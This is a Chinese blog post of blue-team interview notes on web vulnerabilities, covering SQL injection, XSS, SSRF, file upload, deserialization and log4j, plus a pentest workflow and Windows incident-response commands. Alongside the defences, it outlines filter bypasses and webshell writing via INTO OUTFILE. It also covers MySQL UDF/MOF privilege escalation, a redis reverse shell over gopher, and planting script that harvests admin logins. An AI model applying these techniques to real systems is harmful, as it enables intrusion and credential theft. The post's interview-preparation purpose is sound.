<!DOCTYPE html>
<html lang="zh-CN">

  
<head>
  <meta charset="utf-8">
  <meta name="author" content="johnscott" />
  
  
  
  <title>80蓝队面试题整理 | JohnScott2046的博客</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="网络安全,网络安全," />
  

  <script>
    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
  </script>

  
    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
  

  

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/icon/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  
<script src="/js/util.js"></script>
<script src="/js/valine.min.js"></script>


  

  
    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
  

  
    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
  
  
  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
  
  
    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
  

<meta name="generator" content="Hexo 5.1.1"></head>

  <body>

    

    <div id="app">

      <div class="header-wrap">
  <header>
    <div class="site-brand">
      <div class="site-title">
        <a href="/">JohnScott2046</a>
      </div>
    </div>
    <nav class="site-navigation">
      <ul class="nav-menu">
      
        <li class="nav-item" data-path="/">
          
            <a 
              href="/"
              target="_self"
            >
              主页
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/archives/">
          
            <a 
              href="/archives/"
              target="_self"
            >
              归档
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/categories/">
          
            <a 
              href="/categories/"
              target="_self"
            >
              分类
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/tags/">
          
            <a 
              href="/tags/"
              target="_self"
            >
              标签
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/friends/">
          
            <a 
              href="/friends/"
              target="_self"
            >
              友链
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/about/">
          
            <a 
              href="/about/"
              target="_self"
            >
              关于
            </a>
          
        </li>
      
        <li class="nav-item" data-path="">
          
            <a href="javascript:void(0);" v-else>联系我</a>
            <ul class="nav-menu--dropdown">
              
                <li>
                  <a 
                    href="https://github.com/liuxue5213" 
                    target="_blank"
                  >
                    Github
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.zhihu.com/people/liuxue5213" 
                    target="_blank"
                  >
                    知乎
                  </a>
                </li>
              
                <li>
                  <a 
                    href="http://weibo.com/liuxue5213" 
                    target="_blank"
                  >
                    微博
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.douban.com/people/liuxue5213" 
                    target="_blank"
                  >
                    豆瓣
                  </a>
                </li>
              
                <li>
                  <a 
                    href="/linkedin.com/in/liuxue5213" 
                    target="_blank"
                  >
                    linkedin
                  </a>
                </li>
              
            </ul>
          
        </li>
      
      </ul>
    </nav>
    <i class="iconfont icon-menu"></i>
  </header>
</div>

<script>
  let links = document.querySelectorAll('.nav-item');
  for(let link of links){
    let childrenLink = link.querySelector('ul');
    link.addEventListener('mouseenter', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown active";
      }
    })
    link.addEventListener('mouseleave', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown";
      }
    })
  }
  let rootRealPath = getRealPath(window.location.pathname, true);
  for(let link of links) {
    let linkPath = link.getAttribute("data-path");
    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
      link.className = "nav-item hover";
    }
  }

  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
    iconMenuClicked = false;
  let navDOM = document.querySelector("nav.site-navigation");
  iconMenu.addEventListener("click", () => {
    iconMenuClicked 
      ? navDOM.className = "site-navigation active"
      : navDOM.className = "site-navigation";
    iconMenuClicked = !iconMenuClicked;
  })
</script>

      








<div class="container post-index">

  

<div class="post">
  <h1 class="article-title">
    <span>80蓝队面试题整理</span>
  </h1>
  <div class="article-top-meta">
    <span>
      发布 : 
      2022-08-13
    </span>
    
      <span>
        分类 : 
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
            网络安全
          </a>
      </span>
    
    
      <span>
        浏览 : <span class="article-timer" data-identity="80蓝队面试题整理"></span>
      </span>
    
  </div>

  

  <div class="article-content">
    <div class="markdown-body">
      <h2 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>原理：用户的非法输入 没有完全过滤就拼接到SQL语句中执行<br>成因：未对用户输入的数据做验证或者处理（预编译）<br>防御：预编译（能够防止SQL注入，但是不能处理%和_特殊字符）</p>
<p>黑名单：对特殊字符进行转义过滤替换或者删除、<br>白名单：对用户输入进行限制（正则表达式限制）、<br>规范编码和字符集（编码不同可能会导致宽字节注入）、<br>参数化查询（原理）：不会把参数的内容当做sql语句执行，完成编译后套用参数运行</p>
<p>分类：<br>头注入：UA（useragent）,Referer,cookie<br>union联合查询注入<br>报错注入 需要用到的函数：updataxml（）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rand()： 产生一个0-1之间随机数，rand(0),随机产生一个0-1的随机数，运行多次产生的结果一样</span><br><span class="line">floor()： 向下取整，floor(rand()*2)，随机产生0和1两个数</span><br><span class="line">group by： 分组排列</span><br><span class="line">count()： 统计数量</span><br><span class="line">concat()： 将字符串连接起来</span><br></pre></td></tr></table></figure>

<p>布尔盲注<br>堆叠：1；select··<br>时间盲注：需要用到的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(condition,A,B) --如果条件成立返回A，否则返回B；用啥语句替代if？？？？？？？</span><br><span class="line">sleep(num) --表示延迟几秒</span><br><span class="line">left(m,n) --从左向右截取字符串 m 返回其前 n 位</span><br><span class="line">substr(m,1,1) --取字符串 m 的左边第一位起，1字长的字符串</span><br><span class="line">ascii(m) --返回字符 m 的 ASCII 码</span><br><span class="line">length(m) --返回字符串 m 的长度</span><br><span class="line">count(column_name) --返回指定列的值的数目</span><br></pre></td></tr></table></figure>

<p>宽字节注入<br>PHP utf-8编码 数据库GBK编码<br>PHP防御函数：magic_quotes_gpc()<br>成因：PHP发送请求到mysql时经过一次gbk编码，PHP会将获取到的数据进行魔术引号的处理，因为GBK是双字节编码，所以我们提交的%df这个字符和转译的反斜杠组成了新的汉字，然后数据库处理的时候是根据GBK去处理的，然后单引号就逃逸了出来。<br>原理：在数据库中使用宽字符集，在web中没有考虑这个问题。由于0XDF27在web中是两个字符，在php中会对0x27进行转义，把0XDF27变成0XDF5c27</p>
<p>常问问题：</p>
<p>被过滤怎么办</p>
<ol>
<li>过滤<em>关键字</em>            使用大小写绕过，双写绕过，URL编码绕过</li>
<li>过滤<em>特殊字符</em>，<em>空格</em>   使用URL编码绕过</li>
<li>过滤<em>注释</em>              使用添加一个闭合方式绕过，逻辑运算绕过</li>
<li>过滤<em>单引号</em>            使用宽字符绕过(前提PHP使用GBK编码)</li>
<li>过滤<em>明码数据</em>          使用burpsuite加密发送数据绕过</li>
</ol>
<p>代替空格：/**/、、%0a、%0b、%a0</p>
<p>如何写shell：利用日志写shell：<br>root权限，GPC关闭，知道文件路径 的前提<br>日志路径：var/log/mysqld.sql<br>select ‘一句话’ into outfile ‘路径’<br>select ‘一句话’ into dumpfile ‘路径’<br>如果你拿到了sql的权限，你怎么获取系统权限</p>
<p>Mysql_UDF提权<br>利用了root高权限，创建一个可以调用 cmd 的函数的 udf.dll 动态链接库， 导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd<br>  限制条件：<br>  1-MySQL 数据库没有开启安全模式（确认secure_file_priv=’’是否为空）<br>  2-已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。<br>  3-shell有写入到数据库安装目录的权限。</p>
<p>MOF提权<br>基本上在Windows Server 2003的环境下才可以成功。</p>
<p>原理是C:/Windows/system32/wbem/mof/目录下的mof文件每隔几秒就会被系统执行一次，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本 来调用CMD来执行系统命令<br>如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令了</p>
<p>mysql5.0以上和5.0以下区别<br>5.0以下没有系统表（information_schema）,只能暴力跑表</p>
<p>为何一个mysql数据库的站，只有一个80端口开放<br>更改了数据库端口，没有扫描出来。<br>网站和数据库分离<br>3306 端口不对外开放</p>
<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>原理: 通过拼接恶意的html代码，利用js语句来执行攻击，实现对用户浏览器的攻击<br>类型:</p>
<ul>
<li>反射型：攻击代码在url里，输出在http响应中</li>
<li>存储型：把用户输入的数据存储在服务器上</li>
<li>DOM型：通过修改页面的DOM结点形成xss</li>
</ul>
<p>反射和dom的区别: DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理<br>XSS绕过：<br>  1.大小写<br>  2.js伪协议<br>  3.没有分号<br>  4.Flash<br>  5.Html5新标签<br>  6.Fuzz进行测试<br>  7.双层标签绕过</p>
<p>修复防御：<br>  1.对输出内容实体化编码，对JavaScript的事件进行过滤<br>  2.对重要的cookie设置httpOnly, 防止客户端通过document.cookie读取 cookie，此 HTTP头由服务端设置。<br>  3.csp防范xss</p>
<p>常问问题：</p>
<ul>
<li>xss蠕虫产生条件：用户之间产生交互行为的页面都可能造成xss蠕虫，不一定需要存储型xss</li>
<li>有shell的情况下如何长久控制：<br>后台登录处加一段记录登录账号密码的js，判断是否登录成功，<br>如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。在登录后才可以访问的文件中插入XSS脚本</li>
</ul>
<h3 id="CSRF跨站请求伪造攻击-客户端请求伪造"><a href="#CSRF跨站请求伪造攻击-客户端请求伪造" class="headerlink" title="CSRF跨站请求伪造攻击/客户端请求伪造"></a>CSRF跨站请求伪造攻击/客户端请求伪造</h3><p>原理：用户访问恶意网站时运行恶意网站上加载的JS，然后攻击者就可以利用受害者的身份 对已经登陆的正常网站发送数据包，达到篡改信息、修改配置等功能</p>
<p>成因：Cookie不过期，没有进行进一步的验证用户信息，没有安全意识访问了恶意站点</p>
<p>利用：受害者必须依次完成两个步骤，登陆受信任网站A，并在本地生成cookie，在不登出A的情况下，访问危险网站B</p>
<p>防御：加token或者验证码；尽量使用POST，限制GET；</p>
<h3 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h3><p>原理：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p>
<p>常出现在：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具</p>
<p>协议:<br>file：在有回显的情况下，利用 file 协议可以读取任意内容<br>dict：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>http/s：探测内网主机存活<br>引发ssrf漏洞的PHP函数</p>
<p>file_get_contents：文件写入字符串，当url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取。<br>fsockopen(主机名称，端口号码，错误号的接受变量，错误提示的接受变量，超时时间)<br>curl_exec()：执行一个curl会话</p>
<p>绕过：<br>利用@：<a target="_blank" rel="noopener" href="http://example/">http://example</a><span class="label label-primary">@127.0.0.1。例如</span>：<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a><span class="label label-primary">@10.10.10.10与http</span>://10.10.10.10 请求是相同的<br>添加端口号：<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a><br>利用短地址：<a target="_blank" rel="noopener" href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a></p>
<p>ip 地址进制转换<br>DNS解析 <a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/%E5%8F%AF%E4%BB%A5%E6%8C%87%E5%90%91%E4%BB%BB%E6%84%8Fip%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%9Axip.io">http://127.0.0.1.xip.io/可以指向任意ip的域名：xip.io</a></p>
<p>利用：利用伪协议对内网信息进行探测<br>具体利用的方式：file协议查看文件、dict协议探测端口、ophergopher协议 支持GET&amp;POST请求，同时在攻击内网ftp、redis、telnet、Memcache上有极大作用。利用 gopher协议访问redis反弹shell</p>
<p>防御：禁止跳转；禁用不需要的协议；黑名单内网ip</p>
<h3 id="xss与csrf区别"><a href="#xss与csrf区别" class="headerlink" title="xss与csrf区别"></a>xss与csrf区别</h3><p>XSS：跨站脚本攻击；利用站点内的信任用户盗取cookie<br>CSRF：跨站请求伪造攻击；通过伪装成信任用户请求信任的网站</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>原理：由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件，并通过此脚本文件获得了执行服务端命令的能力。<br>原理：程序员开发的时候没有对包含的文件进行严格的过滤，攻击者可以构造自己的图片木马文件当做PHP执行</p>
<p>服务器解析漏洞<br>apache:<br>绕过程序检测：当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。<br>在上传文件时，判断文件名是否是PHP，ASP，ASPX，ASA，CER等脚本扩展名，如果是，则不允许上传，这是可以构造类似1.php.rar等扩展名绕过程序检测，并配合解析漏洞获取webshell</p>
<p>iis<br>当建*.asa ，*.asp，*.cer格式的文件夹时，其目录下的任何扩展名的文件都将被IIS当做asp文件进行解析</p>
<p>当文件为*.asp;1.jpg时，IIS会以asp脚本来执行</p>
<p>nginx<br>原理：Nginx实际上是PHP CGI解析漏洞，在PHP配置文件中有一个关键选项cgi.fi:x_pathinfo，一般是默认开启的，<br>        所以<strong>解析到不存在的文件时，PHP会向前递归解析，于是造成了解析漏洞。</strong><br>攻击者可以上传木马文件，然后在URL后面加上xxx.php(可随便命名），就可以获得网站的webshell。<br>比如访问<a target="_blank" rel="noopener" href="http://www.xxx.com/1.jpg/1.php%EF%BC%8C%E6%AD%A4%E6%97%B61.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E5%81%9Aphp%E8%84%9A%E6%9C%AC%E6%9D%A5%E8%A7%A3%E6%9E%90%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%841.php%E6%98%AF%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E3%80%82">http://www.xxx.com/1.jpg/1.php，此时1.jpg会被当做php脚本来解析，这里的1.php是不存在的。</a></p>
<p>绕过方法<br>  1.黑名单<br>      a.后缀名不完整 .php5 .phtml等<br>      b. .htacess<br>      c.大小写<br>      d.在数据包中 后文件缀名前加空格<br>      e.后缀名前加<br>      f.加上::$DATA<br>      g.未循环验证，可以使用x.php..类似的方法<br>  2.白名单:%00截断,图片马,条件竞争</p>
<p>防御：<br>  1.后端验证：采用服务端验证模式 2.后缀验证：基于白名单，黑名单过滤 3.MIME验证：基于上传自带类型艰检测 4.内容检测：文件头，完整性检测 5.自带函数过滤 6.WAF防护软件：宝塔、云盾等<br>   将上传文件与web服务隔离<br>   白名单过滤、限制上传文件类型<br>   文件上传路径设置为不可执行权限<br>   检查文件上传路径<br>   自带函数检测<br>   自定义函数检测<br>   图片渲染<br>   对上传文件重命名<br>   对文件内容压缩，重新生成文件内容<br>   检查文件内容</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>常见包含函数：<br>include（）：找不到被包含的文件时只会产生警告，脚本将继续运行。<br>include_once（）：找不到被包含的文件时只会产生警告，脚本将继续运行。如果该文件中的代码已经被包含，则不会再次包含，即程序只调用一次。<br>require（）：找不到被包含的文件时会产生致命错误，并停止脚本运行。<br>require_once（）：找不到被包含的文件时会产生致命错误，并停止脚本运行。如果该文件中的代码已经被包含，则不会再次包含，即程序只调用一次。</p>
<p>PHP封装协议：<br>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p>
<p>利用：<br>利用../ 目录遍历<br>利用解析漏洞结合文件上传 绕过waf获取webshell<br>利用PHP封装协议 读取php文件源码</p>
<p>防御<br>PHP中使用open_basedir限制访问在指定的目录区域<br>过滤 点 . 反斜杠 / \，防止跨目录<br>禁止服务器远程文件包含<br>尽量不要使用动态包含，可以在需要包含的页面固定写好</p>
<p>危害：敏感信息泄露（任何文件读取）；PHP伪协议，文件包含读源码，命令执行；配合图片马获取webshell</p>
<h3 id="PHP序列化与反序列化"><a href="#PHP序列化与反序列化" class="headerlink" title="PHP序列化与反序列化"></a>PHP序列化与反序列化</h3><p>原理：（在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行）未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动融发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
<p>序列化函数 ：serialize()：将对象转换成字符串</p>
<p>反序列化函数：unserialize()：将字符串转换成对象</p>
<p>魔术方法(文件中存在可利用的类，类中有魔术方法</p>
<p>__wakeup() //使用unserialize时触发<br> __sleep() //使用serialize时触发<br> __construct() //创建对象时触发<br> __destruct() //对象被销毁时触发<br> __call() //在对象上下文中调用不可访问的方法时触发<br> __callStatic() //在静态上下文中调用不可访问的方法时触发<br> __get() //用于从不可访问的属性读取数据<br> __set() //用于将数据写入不可访问的属性<br> __isset() //在不可访问的属性上调用isset()或empty()触发<br> __unset() //在不可访问的属性上使用unset()时触发<br> __toString() //把类当作字符串使用时触发<br> __invoke() //当脚本尝试将对象调用为函数时触发<br>绕过wakeup的要点是：成员属性数目大于实际数目时可绕过</p>
<h3 id="流量分析（PCAP-文件）"><a href="#流量分析（PCAP-文件）" class="headerlink" title="流量分析（PCAP 文件）"></a>流量分析（PCAP 文件）</h3><p>1、大量的404请求：目录扫描<br>2、大量select *** from：SQL注入<br>3、连续一个IP的多端口请求或多个IP的几个相同端口：端口扫描<br>4、爆破账号密码：ip.addr219.239.105.18 and http.request.uri matches “edit|uoload|modify”<br>5、用菜刀链接的包，post请求 ip.addr219.239.105.18 and htpp.request.method==POST</p>
<h3 id="log4j反序列化"><a href="#log4j反序列化" class="headerlink" title="log4j反序列化"></a>log4j反序列化</h3><p>核心原理为，在正常的log处理过程中对**${**这两个紧邻的字符做了检测，一旦匹配到类似 于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不 是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行 。</p>
<p>漏洞成因、特征：在打印日志的时候，如果日志内容中包含关键词 ${，攻击者就能将关键字所包含的内容当作变量来替换成任何攻击命令，并且执行。</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>1 .-Pn，禁ping扫描，nmap在对主机执行扫描动作之前，会发送一个ICMP包，去探测远程主机是否存活，如果对方有返回的话，nmap才认为这个扫描任务执行是有意义的，并且开始扫描。如果没有返回包，则不执行扫描。如果对方主机设置了禁ping，在不加-Pn的情况下，是不会返回扫描结果的。<br>2 .-sP，此命令的意义在于是令nmap去用ping命令去探测对方主机的存活情况。如果对方的机器能ping通的话，就告诉我们host is up。不绝对准确，因为可能对方主机设置了禁ping。<br>3 .-sS，半开放扫描。在TCP协议的三次握手的过程当中。会由客户端向服务端发送SYN包，如果服务器的端口是开放的，服务器则会返回一个SYN包+一个ACK，第三部再由客户端验证服务器的ACK是否正确，如若正确，则发送ACK包到服务器以便完成TCP连接的建立。这种扫描的原理就是客户端只执行第一步，服务端执行第二步，第三步不做了。这种方法的好处是可以规避日志的记录。<br>4 .-sT，TCP协议三次完全扫描。<br>5 .-PR，使用ARP协议，进行局域网内主机扫描，这种扫描会令速度更快，并且结果更加准确。<br>6 .-O，用于探测对方主机的操作系统的。<br>7 .-p，计算机的端口是有65535个的。如果扫描全端口，则写作-p 1-65535<br>8 .-T4，默认情况是3。<br>9 .-P0，用于在禁ping时探测主机存活。</p>
<h3 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h3><p>goby，扫描工具</p>
<p>可以根据情形定制一些常见端口扫描<br>不仅可以扫IP ，还可以扫域名<br>扫描的时候也可以加上 想测试是否存在的 漏洞的 POC<br>可以自定义暴破字典<br>最后报告还可以导入导出<br>渗透测试流程：如果给你一个网站,你的渗透测试思路是什么?/拿到一个待检测的站，你觉得应该先做什么？</p>
<p>搜索引擎</p>
<p> 信息收集<br>     a、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>     b、网站指纹识别（包括，cms，cdn，证书等），dns记录<br>     c、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>     e、子域名收集，旁站，C段等<br>     f、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>     g、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br>     h、传输协议，通用漏洞，exp，github源码等<br> 漏洞挖掘<br>     a、浏览网站，看看网站规模，功能，特点等<br>     b、端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>     c、XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等<br> 漏洞扫描<br>     开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等<br> 漏洞利用<br>     利用msf，nc一些工具拿shell，或者其他权限<br> 权限提升<br>     a、mysql提权，udf提权，mof提权，serv-u提权，oracle提权<br>     b、windows 溢出提权<br>     c、linux脏牛,内核漏洞提权<br> 日志清理</p>
<h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><p>网站被挂马如何应急</p>
<p>1.取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件-注意文件的时间， 用户，后缀等属性），调取日志（系统，中间件日志，WAF日志等）；<br>2.处理，恢复备份（快照回滚最近一次），确定入侵方法（漏洞检测并进行修复）<br>3.溯源，查入侵IP，入侵手法（网路攻击事件）的确定等<br>4.记录，归档——–预防-事件检测-抑制-根除-恢复-跟踪-记录通用漏洞的应对等其他 安全应急事件</p>
<p>入侵排查具体流程</p>
<p>1、检查系统账号安全<br>查看服务器是否有弱口令，远程管理端口是否公开<br>查看服务器是否有可疑账号：cmd输入lusrmgr.msc命令<br>查看服务器是否存在隐藏账号、克隆账号<br>结合日志，查看管理员登录时间，用户名是否存在异常</p>
<p>2、检查异常端口、进程<br> 检查端口连接情况，是否有远程连接、可疑连接：<br>a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED<br>b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</p>
<p>3、检查启动项、计划任务、服务<br>win+r：输入msconfig，查看异常启动项<br>win+r：输入regedit，打开注册表，查看开机启动项</p>
<p>4、检查系统相关信息<br>win+r：输入systeminfo查看系统信息</p>
<p>5、日志分析<br>win+r：输入eventvwr.msc,打开事件查看器<br>导出应用程序日志，安全日志，系统日志，利用log parser分析</p>
<p>windows排查<br>系统账户</p>
<p>进程端口<br>netstat -ano #查看所有网络连接及其 PID<br>netstat -ano | findstr 443 #过滤特定端口的网络连接<br>netstat -ano | findstr TCP #过滤 TCP 连接<br>tasklist | findstr 18544 #查看 PID 为 18544 的进程<br>taskkill /F /pid 18544 #强制结束进程</p>
<p>1、先查看目前的网络连接，定位可疑的 ESTABLISHED 连接<br>2、使用 tasklist | findstr 3232 查找 PID=3232 的进程名称：<br>3、查看进程路径  Windows+R+输入 msinfo32，打开“系统信息功能”并依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程 ID、文件创建日期、启动时间等：<br>4、最后应急处理，进程并删除文件，执行命令 taskkill /F /pid 3232</p>
<p>启动项<br>目的是检查服务器是否有异常的启动项<br>1、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马:<br>2、检查组策略，运行 gpedit.msc：<br>以上是开关机以及用户登录注销时会启动的脚本，注意查看里面是否存放了恶意脚本。</p>
<p>计划任务<br>控制面板-&gt;计划任务<br>Win+R-&gt;cmd-&gt;schtasks/at<br>1、访问“计算机管理”功能，查看“任务计划程序库”，查看是否存在可疑的计划任务：<br>2、另一种查看方法是，执行命令  schtasks.exe，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接：</p>
<p>服务自启动<br>Win+R-&gt;services.msc</p>
<p>系统信息<br>1、查看系统版本以及补丁信息，可执行命令 systeminfo，查看系统信息：<br>2、排查当前用户最近打开文件，可以在文件管理器输入%userprofile%\recent，即可查看最近打开的文件</p>
<p>日志信息<br>1、Windows 的 C:\Windows\System32\winevt\Logs 路径下存放了系统各类日志文件：<br>2、双击选中 “Securuty” 安全事件日志文件，可进入事件查看器（另一种办法是Win+R打开运行，输入“eventvwr.msc”，回车运行，直接打开“事件查看器”）：</p>
<p>系统日志<br>前提：开启审核策略<br>Win+R-&gt;eventvwr.msc-&gt;导出安全日志-&gt;LogParser进行分析</p>
<p>gscan检测<br>chkrootkit   <a target="_blank" rel="noopener" href="http://www.chkrootkit.org/">http://www.chkrootkit.org/</a><br>病毒查杀<a target="_blank" rel="noopener" href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a><br>河马  <a target="_blank" rel="noopener" href="https://www.shellpub.com/">https://www.shellpub.com/</a><br>D盾 <a target="_blank" rel="noopener" href="http://www.d99net.net/">http://www.d99net.net</a><br>百度WEBDIR+ <a target="_blank" rel="noopener" href="https://scanner.baidu.com/">https://scanner.baidu.com</a><br>Web Shell Detector <a target="_blank" rel="noopener" href="http://www.shelldetector.com/">http://www.shelldetector.com</a><br>CloudWalker(牧云) <a target="_blank" rel="noopener" href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn</a><br>深度学习模型检测PHP Webshell <a target="_blank" rel="noopener" href="http://webshell.cdxy.me/">http://webshell.cdxy.me</a><br>findWebshell <a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p>
<p>勒索病毒搜索引擎<br>360：<a target="_blank" rel="noopener" href="http://lesuobingdu.360.cn/">http://lesuobingdu.360.cn</a><br>腾讯：<a target="_blank" rel="noopener" href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a><br>启明：<a target="_blank" rel="noopener" href="https://lesuo.venuseye.com.cn/">https://lesuo.venuseye.com.cn</a><br>奇安信：<a target="_blank" rel="noopener" href="https://lesuobingdu.qianxin.com/">https://lesuobingdu.qianxin.com</a><br>深信服：<a target="_blank" rel="noopener" href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p>
<p>勒索软件解密工具集<br>腾讯哈勃：<a target="_blank" rel="noopener" href="https://habo.qq.com/tool">https://habo.qq.com/tool</a><br>金山毒霸：<a target="_blank" rel="noopener" href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a><br>火绒：<a target="_blank" rel="noopener" href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a><br>瑞星：<a target="_blank" rel="noopener" href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a><br>Nomoreransom：<a target="_blank" rel="noopener" href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a><br>MalwareHunterTeam：<a target="_blank" rel="noopener" 